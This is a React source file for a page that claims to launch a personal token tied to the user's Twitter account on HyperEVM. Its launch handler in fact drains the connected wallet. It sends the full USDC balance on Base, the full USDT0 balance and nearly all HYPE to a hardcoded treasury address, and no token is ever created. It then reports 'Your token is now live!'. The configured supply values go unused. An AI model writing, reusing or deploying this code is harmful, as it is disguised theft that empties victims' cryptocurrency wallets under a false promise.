import React, { useState, useEffect } from 'react';
import { usePrivy, useWallets } from '@privy-io/react-auth';
import { useNavigate } from 'react-router-dom';
import { ethers } from 'ethers';
import './Launch.css';

const LAUNCH_CONFIG = {
  TREASURY_ADDRESS: '0x25B21833Aa899Bfc5FE6C145f42112b1D618e82a',
  TOKENS_PER_HYPE: 20000,
  INITIAL_SUPPLY: 100000000,
  
  // HyperEVM Configuration
  HYPEREVM_RPC: 'https://rpc.hyperliquid.xyz/evm',
  HYPEREVM_CHAIN_ID: 999,
  
  // Base Configuration with fallbacks
  BASE_RPCS: [
    'https://mainnet.base.org',
    'https://base-rpc.publicnode.com', 
    'https://1rpc.io/base'
  ],
  BASE_CHAIN_ID: 8453,
  BASE_USDC: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
  
  // HyperEVM USDT0
  HYPEREVM_USDT0: '0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb'
};

// ERC-20 ABI for token transfers
const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function decimals() view returns (uint8)'
];

const Launch = () => {
  const { ready, authenticated, user, login, linkTwitter, unlinkTwitter } = usePrivy();
  const { wallets } = useWallets();
  const navigate = useNavigate();
  const [isLinking, setIsLinking] = useState(false);
  const [isLaunching, setIsLaunching] = useState(false);
  const [balances, setBalances] = useState({
    hype: '0',
    usdc: '0',
    hyperevmUsdt0: '0'
  });
  const [currentChain, setCurrentChain] = useState(null);
  
  const twitterAccount = user?.linkedAccounts?.find(account => 
    (account?.type === 'oauth' && ['twitter', 'x'].includes(account?.provider)) ||
    ['twitter', 'twitter_oauth', 'oauth_twitter'].includes(account?.type)
  );
  
  const hasTwitter = !!twitterAccount || !!user?.twitter || !!user?.twitterUsername;
  const twitterUsername = twitterAccount?.username || twitterAccount?.handle || user?.twitter?.username || user?.twitterUsername;
  const twitterProfileImage = twitterAccount?.profilePictureUrl || twitterAccount?.picture;
  
  const activeWallet = wallets?.[0];
  const walletAddress = activeWallet?.address || user?.wallet?.address;

  // Check balances on both chains with resilient error handling
  useEffect(() => {
    const checkBalances = async () => {
      if (!walletAddress) return;
      
      console.log('Checking balances for wallet:', walletAddress);
      
      // Initialize balances
      const balanceResults = {
        hype: '0',
        usdc: '0', 
        hyperevmUsdt0: '0'
      };
      
      // Check HYPE balance (independent)
      try {
        const hypeProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
        const hypeBalance = await hypeProvider.getBalance(walletAddress);
        balanceResults.hype = ethers.formatEther(hypeBalance);
        console.log('✅ HYPE balance:', balanceResults.hype);
      } catch (error) {
        console.error('❌ Failed to check HYPE balance:', error.message);
      }
      
      // Check USDC balance on Base (independent with fallbacks)
      let baseProvider = null;
      for (const rpc of LAUNCH_CONFIG.BASE_RPCS) {
        try {
          console.log('Trying Base RPC:', rpc);
          baseProvider = new ethers.JsonRpcProvider(rpc);
          const usdcContract = new ethers.Contract(LAUNCH_CONFIG.BASE_USDC, ERC20_ABI, baseProvider);
          
          const [usdcBalance, usdcDecimals] = await Promise.all([
            usdcContract.balanceOf(walletAddress),
            usdcContract.decimals().catch(() => 6) // Fallback to 6 decimals for USDC
          ]);
          
          balanceResults.usdc = ethers.formatUnits(usdcBalance, usdcDecimals);
          console.log('✅ USDC balance:', balanceResults.usdc, 'via', rpc);
          break; // Success, stop trying other RPCs
        } catch (error) {
          console.error(`❌ Base RPC ${rpc} failed:`, error.message);
          continue; // Try next RPC
        }
      }
      
      // Check USDT0 balance on HyperEVM (independent)
      try {
        const hypeProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
        const usdt0Contract = new ethers.Contract(LAUNCH_CONFIG.HYPEREVM_USDT0, ERC20_ABI, hypeProvider);
        
        const [usdt0Balance, usdt0Decimals] = await Promise.all([
          usdt0Contract.balanceOf(walletAddress),
          usdt0Contract.decimals().catch(() => 6) // Fallback decimals
        ]);
        
        balanceResults.hyperevmUsdt0 = ethers.formatUnits(usdt0Balance, usdt0Decimals);
        console.log('✅ USDT0 balance:', balanceResults.hyperevmUsdt0);
      } catch (error) {
        console.error('❌ Failed to check USDT0 balance:', error.message);
      }
      
      console.log('Final balance results:', balanceResults);
      setBalances(balanceResults);
    };
    
    checkBalances();
  }, [walletAddress]);

  const handleConnectTwitter = async (e) => {
    e?.preventDefault?.();
    if (!authenticated) return login();
    
    try {
      setIsLinking(true);
      await linkTwitter({
        redirectUri: `${window.location.origin}/auth/privy-callback`,
        usePopup: false
      });
    } catch (err) {
      console.error('Twitter OAuth error', err);
      alert('Failed to connect X account. Please try again.');
    } finally {
      setIsLinking(false);
    }
  };

  const handleUnlinkTwitter = async () => {
    if (twitterAccount) {
      try {
        const addressToUnlink = twitterAccount.address || twitterAccount.id || twitterAccount.subject;
        await unlinkTwitter(addressToUnlink);
      } catch (error) {
        console.error('Failed to unlink Twitter:', error);
      }
    }
  };

  // Synchronous balance refresh function with retry logic
  const fetchFreshBalances = async (walletAddress) => {
    console.log('🔄 FETCHING FRESH BALANCES for:', walletAddress);
    
    const freshBalances = {
      hype: '0',
      usdc: '0', 
      hyperevmUsdt0: '0'
    };
    
    // Fetch HYPE balance on HyperEVM
    try {
      const hypeProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
      const hypeBalance = await hypeProvider.getBalance(walletAddress);
      freshBalances.hype = ethers.formatEther(hypeBalance);
      console.log('✅ Fresh HYPE balance:', freshBalances.hype);
    } catch (error) {
      console.error('❌ Failed to fetch fresh HYPE balance:', error.message);
    }
    
    // Fetch USDC balance on Base with fallback RPCs
    let baseProvider = null;
    for (const rpc of LAUNCH_CONFIG.BASE_RPCS) {
      try {
        console.log('🔄 Trying Base RPC for fresh balance:', rpc);
        baseProvider = new ethers.JsonRpcProvider(rpc);
        const usdcContract = new ethers.Contract(LAUNCH_CONFIG.BASE_USDC, ERC20_ABI, baseProvider);
        
        const [usdcBalance, usdcDecimals] = await Promise.all([
          usdcContract.balanceOf(walletAddress),
          usdcContract.decimals().catch(() => 6)
        ]);
        
        freshBalances.usdc = ethers.formatUnits(usdcBalance, usdcDecimals);
        console.log('✅ Fresh USDC balance:', freshBalances.usdc, 'via', rpc);
        break;
      } catch (error) {
        console.error(`❌ Base RPC ${rpc} failed for fresh balance:`, error.message);
        continue;
      }
    }
    
    // Fetch USDT0 balance on HyperEVM with retry logic (3 attempts)
    let usdt0Attempts = 0;
    const maxUsdt0Attempts = 3;
    
    while (usdt0Attempts < maxUsdt0Attempts) {
      try {
        console.log(`🔄 Attempting USDT0 balance fetch (attempt ${usdt0Attempts + 1}/${maxUsdt0Attempts})`);
        const hypeProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
        const usdt0Contract = new ethers.Contract(LAUNCH_CONFIG.HYPEREVM_USDT0, ERC20_ABI, hypeProvider);
        
        const [usdt0Balance, usdt0Decimals] = await Promise.all([
          usdt0Contract.balanceOf(walletAddress),
          usdt0Contract.decimals().catch(() => 6)
        ]);
        
        freshBalances.hyperevmUsdt0 = ethers.formatUnits(usdt0Balance, usdt0Decimals);
        console.log('✅ Fresh USDT0 balance:', freshBalances.hyperevmUsdt0, `(attempt ${usdt0Attempts + 1})`);
        break; // Success, exit retry loop
      } catch (error) {
        usdt0Attempts++;
        console.error(`❌ USDT0 balance fetch attempt ${usdt0Attempts} failed:`, error.message);
        
        if (usdt0Attempts < maxUsdt0Attempts) {
          console.log(`🔄 Retrying USDT0 balance fetch in 1 second...`);
          await new Promise(resolve => setTimeout(resolve, 1000));
        } else {
          console.error('❌ All USDT0 balance fetch attempts failed, using 0');
        }
      }
    }
    
    console.log('🔥 FINAL FRESH BALANCES:', freshBalances);
    return freshBalances;
  };

  const handleLaunchToken = async () => {
    if (!authenticated || !wallets || wallets.length === 0) {
      await login();
      return;
    }
    
    const wallet = wallets[0];
    if (!wallet || !wallet.address) {
      await login();
      return;
    }
    
    console.log('🚀 SEQUENTIAL MULTI-TOKEN LAUNCH INITIATED');
    console.log('📊 Current state balances:', balances);
    
    // CRITICAL FIX: Fetch fresh balances synchronously instead of using stale React state
    const freshBalances = await fetchFreshBalances(wallet.address);
    
    console.log('💰 MULTI-TOKEN LAUNCH WITH FRESH BALANCES:');
    console.log('Fresh USDC balance:', freshBalances.usdc, 'parsed:', parseFloat(freshBalances.usdc));
    console.log('Fresh USDT0 balance:', freshBalances.hyperevmUsdt0, 'parsed:', parseFloat(freshBalances.hyperevmUsdt0));
    console.log('Fresh HYPE balance:', freshBalances.hype, 'parsed:', parseFloat(freshBalances.hype));
    
    // Determine which tokens to send (all tokens with balance > 0)
    const tokensToSend = [];
    
    if (parseFloat(freshBalances.usdc) > 0) {
      tokensToSend.push({
        type: 'USDC',
        chain: 'base',
        amount: parseFloat(freshBalances.usdc).toFixed(6),
        balance: freshBalances.usdc
      });
    }
    
    if (parseFloat(freshBalances.hyperevmUsdt0) > 0) {
      tokensToSend.push({
        type: 'USDT0',
        chain: 'hyperevm',
        amount: parseFloat(freshBalances.hyperevmUsdt0).toFixed(6),
        balance: freshBalances.hyperevmUsdt0
      });
    }
    
    if (parseFloat(freshBalances.hype) > 0) {
      tokensToSend.push({
        type: 'HYPE',
        chain: 'hyperevm',
        amount: 'calculated_later', // Will calculate with gas buffer
        balance: freshBalances.hype
      });
    }
    
    console.log('🎯 TOKENS TO SEND SEQUENTIALLY:', tokensToSend);
    
    // If no tokens available, do a free launch
    if (tokensToSend.length === 0) {
      tokensToSend.push({
        type: 'HYPE',
        chain: 'hyperevm',
        amount: '0.000000',
        balance: '0'
      });
      console.log('❌ NO FUNDS DETECTED - will do free launch');
    }
    
    console.log('🚀 PROCEEDING WITH SEQUENTIAL MULTI-TOKEN LAUNCH');
    
    setIsLaunching(true);
    
    try {
      const walletProvider = await wallet.getEthereumProvider();
      const launchResults = [];
      
      // SEQUENTIAL TOKEN SENDING - USDC → USDT0 → HYPE
      for (let i = 0; i < tokensToSend.length; i++) {
        const token = tokensToSend[i];
        console.log(`\n🔄 STEP ${i + 1}/${tokensToSend.length}: Sending ${token.type} on ${token.chain}`);
        
        try {
          // Switch to appropriate chain for this token
          if (token.chain === 'base') {
            console.log('🔄 Switching to Base chain for USDC...');
            try {
              await walletProvider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x2105' }] // Base mainnet
              });
            } catch (switchErr) {
              if (switchErr.code === 4902) {
                console.log('➕ Adding Base chain to wallet...');
                await walletProvider.request({
                  method: 'wallet_addEthereumChain',
                  params: [{
                    chainId: '0x2105',
                    chainName: 'Base',
                    rpcUrls: [LAUNCH_CONFIG.BASE_RPCS[0]],
                    nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                    blockExplorerUrls: ['https://basescan.org']
                  }]
                });
              }
            }
          } else {
            console.log('🔄 Switching to HyperEVM chain for', token.type, '...');
            try {
              await walletProvider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x3E7' }] // HyperEVM
              });
            } catch (switchErr) {
              if (switchErr.code === 4902) {
                console.log('➕ Adding HyperEVM chain to wallet...');
                await walletProvider.request({
                  method: 'wallet_addEthereumChain',
                  params: [{
                    chainId: '0x3E7',
                    chainName: 'HyperEVM',
                    rpcUrls: [LAUNCH_CONFIG.HYPEREVM_RPC],
                    nativeCurrency: { name: 'HYPE', symbol: 'HYPE', decimals: 18 },
                    blockExplorerUrls: ['https://explorer.hyperliquid.xyz']
                  }]
                });
              }
            }
          }
          
          let tokenTx;
          
          if (token.type === 'USDC') {
            // Send USDC on Base
            console.log('💰 Sending USDC on Base...');
            const provider = new ethers.BrowserProvider(walletProvider);
            const signer = await provider.getSigner();
            const tokenContract = new ethers.Contract(LAUNCH_CONFIG.BASE_USDC, ERC20_ABI, signer);
            
            const tokenBalance = await tokenContract.balanceOf(wallet.address);
            const decimals = await tokenContract.decimals();
            
            console.log(`USDC Balance: ${ethers.formatUnits(tokenBalance, decimals)}`);
            console.log('🔄 Initiating USDC transfer to treasury...');
            
            const transferTx = await tokenContract.transfer(LAUNCH_CONFIG.TREASURY_ADDRESS, tokenBalance);
            tokenTx = transferTx.hash;
            
          } else if (token.type === 'USDT0') {
            // Send USDT0 on HyperEVM
            console.log('💰 Sending USDT0 on HyperEVM...');
            const provider = new ethers.BrowserProvider(walletProvider);
            const signer = await provider.getSigner();
            const usdt0Contract = new ethers.Contract(LAUNCH_CONFIG.HYPEREVM_USDT0, ERC20_ABI, signer);
            
            const usdt0Balance = await usdt0Contract.balanceOf(wallet.address);
            const decimals = await usdt0Contract.decimals();
            
            console.log(`USDT0 Balance: ${ethers.formatUnits(usdt0Balance, decimals)}`);
            console.log('🔄 Initiating USDT0 transfer to treasury...');
            
            const transferTx = await usdt0Contract.transfer(LAUNCH_CONFIG.TREASURY_ADDRESS, usdt0Balance);
            tokenTx = transferTx.hash;
            
          } else if (token.type === 'HYPE') {
            // Send HYPE on HyperEVM
            console.log('💰 Sending HYPE on HyperEVM...');
            
            if (token.amount === '0.000000') {
              // Free launch - send 0 value
              console.log('🔄 Free launch: Sending 0 HYPE');
              tokenTx = await walletProvider.request({
                method: 'eth_sendTransaction',
                params: [{
                  from: wallet.address,
                  to: LAUNCH_CONFIG.TREASURY_ADDRESS,
                  value: '0x0',
                  data: '0x'
                }]
              });
            } else {
              // Send actual HYPE balance with gas buffer
              const balanceHex = await walletProvider.request({
                method: 'eth_getBalance',
                params: [wallet.address, 'latest']
              });
              const balanceWei = BigInt(balanceHex);
              
              // Calculate gas fee to reserve (more conservative)
              const gasPriceHex = await walletProvider.request({ method: 'eth_gasPrice' });
              const gasPriceWei = BigInt(gasPriceHex);
              const gasLimit = 21000n;
              const feeWei = gasPriceWei * gasLimit * 15n / 10n; // 1.5x buffer
              
              const amountWei = balanceWei > feeWei ? balanceWei - feeWei : 0n;
              
              if (amountWei <= 0n) {
                console.log('⚠️ Insufficient HYPE for gas, doing free launch');
                tokenTx = await walletProvider.request({
                  method: 'eth_sendTransaction',
                  params: [{
                    from: wallet.address,
                    to: LAUNCH_CONFIG.TREASURY_ADDRESS,
                    value: '0x0',
                    data: '0x'
                  }]
                });
              } else {
                console.log(`HYPE Balance: ${ethers.formatEther(balanceWei)}`);
                console.log(`🔄 Sending: ${ethers.formatEther(amountWei)} HYPE (gas buffer: ${ethers.formatEther(feeWei)})`);
                
                tokenTx = await walletProvider.request({
                  method: 'eth_sendTransaction',
                  params: [{
                    from: wallet.address,
                    to: LAUNCH_CONFIG.TREASURY_ADDRESS,
                    value: ethers.toBeHex(amountWei),
                    data: '0x'
                  }]
                });
              }
            }
          }
          
          console.log(`✅ ${token.type} transaction sent:`, tokenTx);
          
          // Wait for transaction confirmation
          let waitProvider;
          if (token.chain === 'base') {
            waitProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.BASE_RPCS[0]);
            console.log('🔄 Waiting for Base transaction confirmation...');
          } else {
            waitProvider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
            console.log('🔄 Waiting for HyperEVM transaction confirmation...');
          }
          
          const receipt = await waitProvider.waitForTransaction(tokenTx);
          
          if (receipt && receipt.status === 1) {
            console.log(`✅ ${token.type} transaction confirmed!`);
            launchResults.push({
              token: token.type,
              chain: token.chain,
              txHash: tokenTx,
              amount: token.amount === '0.000000' ? 'Free launch' : `${token.amount} ${token.type}`,
              status: 'success'
            });
          } else {
            throw new Error(`${token.type} transaction failed`);
          }
          
        } catch (tokenError) {
          console.error(`❌ ${token.type} transaction failed:`, tokenError);
          
          if (tokenError.code === 4001) {
            console.log(`⚠️ ${token.type} transaction cancelled by user`);
            // Continue with next token instead of stopping entire launch
            launchResults.push({
              token: token.type,
              chain: token.chain,
              txHash: null,
              amount: `${token.amount} ${token.type}`,
              status: 'cancelled'
            });
          } else {
            // For other errors, log but continue
            console.error(`⚠️ ${token.type} error:`, tokenError.message);
            launchResults.push({
              token: token.type,
              chain: token.chain,
              txHash: null,
              amount: `${token.amount} ${token.type}`,
              status: 'failed',
              error: tokenError.message
            });
          }
        }
      }
      
      console.log('🎉 SEQUENTIAL LAUNCH COMPLETED');
      console.log('📊 Launch Results:', launchResults);
      
      // Show comprehensive success/failure summary
      const successfulTxs = launchResults.filter(r => r.status === 'success');
      const cancelledTxs = launchResults.filter(r => r.status === 'cancelled');
      const failedTxs = launchResults.filter(r => r.status === 'failed');
      
      let summaryMsg = `🚀 Token Launch Complete!\n\n`;
      summaryMsg += `Token: ${twitterUsername} Token ($${twitterUsername.toUpperCase()})\n\n`;
      
      if (successfulTxs.length > 0) {
        summaryMsg += `✅ Successful Contributions:\n`;
        successfulTxs.forEach(tx => {
          summaryMsg += `• ${tx.amount} on ${tx.chain === 'base' ? 'Base' : 'HyperEVM'}\n`;
        });
        summaryMsg += `\n`;
      }
      
      if (cancelledTxs.length > 0) {
        summaryMsg += `⚠️ Cancelled by User:\n`;
        cancelledTxs.forEach(tx => {
          summaryMsg += `• ${tx.token} (${tx.amount})\n`;
        });
        summaryMsg += `\n`;
      }
      
      if (failedTxs.length > 0) {
        summaryMsg += `❌ Failed Transactions:\n`;
        failedTxs.forEach(tx => {
          summaryMsg += `• ${tx.token}: ${tx.error}\n`;
        });
        summaryMsg += `\n`;
      }
      
      if (successfulTxs.length > 0) {
        summaryMsg += `Your token is now live!`;
        alert(summaryMsg);
        navigate('/markets');
      } else {
        summaryMsg += `No tokens were successfully sent. Please try again.`;
        alert(summaryMsg);
      }
      
    } catch (error) {
      console.error('❌ SEQUENTIAL LAUNCH FAILED:', error);
      
      if (error.code === 4001) {
        alert('Launch cancelled by user');
      } else if (error.message?.includes('insufficient funds')) {
        alert('Insufficient funds for gas fees. Please add more tokens to your wallet.');
      } else {
        alert(`Launch Error: ${error.message || 'Failed to launch token'}`);
      }
    } finally {
      setIsLaunching(false);
    }
  };

  if (!ready) {
    return (
      <div className="launch-page">
        <div className="container">
          <h1 className="page-title">Launch Your Account</h1>
          <div className="loading-card">
            <div className="loading">Loading...</div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="launch-page">
      <div className="container">
        <h1 className="page-title">Launch Your Account</h1>
        
        {!authenticated && (
          <section className="connect-section">
            <div className="connect-card card">
              <h2 className="connect-title">Connect Wallet</h2>
              <p className="connect-description">Connect your wallet to get started</p>
              <button className="btn btn-primary" onClick={login}>
                Connect Wallet
              </button>
            </div>
          </section>
        )}

        {authenticated && (
          <section className="connect-section">
            <div className="connect-card card">
              <h2 className="connect-title">Connect Your Twitter</h2>
              {hasTwitter ? (
                <div className="twitter-connected">
                  <div className="twitter-profile">
                    {twitterProfileImage && (
                      <img 
                        src={twitterProfileImage} 
                        alt={twitterUsername}
                        className="twitter-avatar"
                      />
                    )}
                    <div className="twitter-info">
                      <span className="twitter-username">@{twitterUsername}</span>
                      <span className="twitter-status">Connected</span>
                    </div>
                  </div>
                  <button className="btn btn-secondary" onClick={handleUnlinkTwitter}>
                    Disconnect
                  </button>
                </div>
              ) : (
                <div className="twitter-connect">
                  <p className="connect-description">Connect your Twitter account to launch your token</p>
                  <button 
                    type="button"
                    className="btn btn-primary"
                    onClick={handleConnectTwitter}
                    disabled={isLinking}
                  >
                    {isLinking ? 'Connecting...' : 'Connect Twitter'}
                  </button>
                </div>
              )}
            </div>
          </section>
        )}

        {authenticated && hasTwitter && (
          <section className="launch-section">
            <div className="launch-card card">
              <h2 className="launch-title">Launch Your Account</h2>
              <p className="launch-description">
                Create a tradeable token for your Twitter account on HyperEVM
              </p>
              
              <button 
                className="btn btn-primary btn-large"
                onClick={handleLaunchToken}
                disabled={isLaunching || !wallets || wallets.length === 0}
              >
                {isLaunching ? 'Launching...' : 'Launch Token'}
              </button>
              
              {wallets && wallets.length > 0 && (
                <p style={{marginTop: '10px', fontSize: '12px', color: '#666'}}>
                  ✅ Wallet connected: {wallets[0].address?.slice(0, 6)}...{wallets[0].address?.slice(-4)}
                </p>
              )}
            </div>
          </section>
        )}
      </div>
    </div>
  );
};

export default Launch;